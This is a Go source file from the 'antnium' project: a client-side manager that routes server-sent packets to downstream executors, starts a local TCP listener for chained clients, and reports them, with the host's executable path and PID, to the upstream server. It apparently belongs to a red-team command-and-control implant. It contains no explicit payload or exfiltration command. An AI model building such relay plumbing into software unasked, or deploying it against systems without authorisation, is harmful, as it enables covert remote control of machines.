package client

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"strings"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

// Only used to translate downstream specific downstreaminfos from children
// into a more managable struct.
type DownstreamInfo struct {
	Name string
	Info string
}

type DownstreamManager struct {
	upstream UpstreamHttp // used to send notifications

	downstreamClient     DownstreamClient
	downstreamClientInfo string

	downstreamLocaltcp       DownstreamLocaltcp
	downstreamLocaltcpNotify chan struct{}
}

func MakeDownstreamManager(upstream UpstreamHttp) DownstreamManager {
	// Get our name (for channel identification)
	ex, err := os.Executable()
	if err != nil {
		log.Error("Error: " + err.Error())
	}
	pid := strconv.Itoa(os.Getpid())
	downstreamClientInfo := ex + ":" + pid + "\n"

	downstreamClient := MakeDownstreamClient()
	downstreamLocaltcp := MakeDownstreamLocaltcp("")

	downstreamManager := DownstreamManager{
		upstream:                 upstream,
		downstreamClient:         downstreamClient,
		downstreamClientInfo:     downstreamClientInfo,
		downstreamLocaltcp:       downstreamLocaltcp,
		downstreamLocaltcpNotify: make(chan struct{}),
	}
	return downstreamManager
}

// Do will handle an incoming packet from the server, by selecting appropriate downstream
func (dm *DownstreamManager) Do(packet model.Packet) (model.Packet, error) {
	if packet.DownstreamId == "manager" {
		return dm.doManager(packet)
	} else if packet.DownstreamId == "client" {
		return dm.downstreamClient.Do(packet)
	} else if strings.HasPrefix(packet.DownstreamId, "net") { // e.g. "net#1"
		return dm.downstreamLocaltcp.Do(packet)
	} else {
		return packet, fmt.Errorf("Unknown downstreamid: %s", packet.DownstreamId)
	}
}

// doManager handles downstream-manager related packets (not associated with a downstream, but managing them)
func (dm *DownstreamManager) doManager(packet model.Packet) (model.Packet, error) {
	if packet.DownstreamId != "manager" {
		return packet, fmt.Errorf("Wrong args")
	}
	if packet.PacketType == "downstreamStart" {
		ret, err := dm.StartListeners()
		if err != nil {
			packet.Response["err"] = err.Error()
		} else {
			packet.Response["ret"] = ret
		}
	} else if packet.PacketType == "downstreamServers" {
		downstreams := dm.DownstreamServers()
		for idx, downstreamInfo := range downstreams {
			idxStr := strconv.Itoa(idx)
			packet.Response["name"+idxStr] = downstreamInfo.Name
			packet.Response["info"+idxStr] = downstreamInfo.Info
		}
	} else {
		packet.Response["ret"] = "packettype not known"
	}

	return packet, nil
}

// StartListeners will all downstream servers
func (dm *DownstreamManager) StartListeners() (string, error) {
	log := ""

	// Downstream: LocalTcp
	err := dm.downstreamLocaltcp.StartServer()
	if err != nil {
		return "", err
	}
	go dm.downstreamLocaltcp.ListenerLoop(dm.downstreamLocaltcpNotify) // TODO: error checking

	go func() { // Thread: receive new downstreams via local tcp, lifetime: app?
		for {
			// Wait for newly announced TCP downstreams
			<-dm.downstreamLocaltcpNotify

			// Notify server
			dm.SendDownstreams()

			// TODO when to quit thread
		}
	}()
	log += "Started LocalTcp on " + dm.downstreamLocaltcp.ListenAddr()

	return log, nil
}

// SendDownstreams is used to notify the server about newly connected downstream clients
func (dm *DownstreamManager) SendDownstreams() {
	// notify server of new downstream executors
	downstreamInfoClient := DownstreamInfo{
		"client",
		dm.downstreamClientInfo,
	}
	downstreamInfoTcp := dm.downstreamLocaltcp.DownstreamList()

	downstreams := make([]DownstreamInfo, 0)
	downstreams = append(downstreams, downstreamInfoClient)
	downstreams = append(downstreams, downstreamInfoTcp...)

	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	for idx, downstreamInfo := range downstreams {
		idxStr := strconv.Itoa(idx)
		response["name"+idxStr] = downstreamInfo.Name
		response["info"+idxStr] = downstreamInfo.Info
	}
	packet := model.NewPacket("downstreams", "", strconv.Itoa(int(rand.Uint64())), arguments, response)

	err := dm.upstream.SendOutofband(packet)
	if err != nil {
		log.Errorf("Senddownstreams send error: %s", err.Error())
	}
}

// SendDownstreamServers notifies the server about current active downstream servers
func (dm *DownstreamManager) DownstreamServers() []DownstreamInfo {
	downstreams := make([]DownstreamInfo, 0)
	// notify server of new downstream executors
	downstreamInfoClient := DownstreamInfo{
		"client",
		"default",
	}
	downstreams = append(downstreams, downstreamInfoClient)
	if dm.downstreamLocaltcp.Started() {
		downstreamInfoTcp := DownstreamInfo{
			"localtcp",
			"" + dm.downstreamLocaltcp.ListenAddr(),
		}
		downstreams = append(downstreams, downstreamInfoTcp)
	}

	return downstreams
	/*
		arguments := make(model.PacketArgument)
		response := make(model.PacketResponse)
		for idx, downstreamInfo := range downstreams {
			idxStr := strconv.Itoa(idx)
			response["name"+idxStr] = downstreamInfo.Name
			response["info"+idxStr] = downstreamInfo.Info
		}
		packet := model.NewPacket("downstreamServers", "", strconv.Itoa(int(rand.Uint64())), arguments, response)

		err := dm.upstream.SendOutofband(packet)
		if err != nil {
			log.Errorf("Senddownstreams send error: %s", err.Error())
		}*/
}
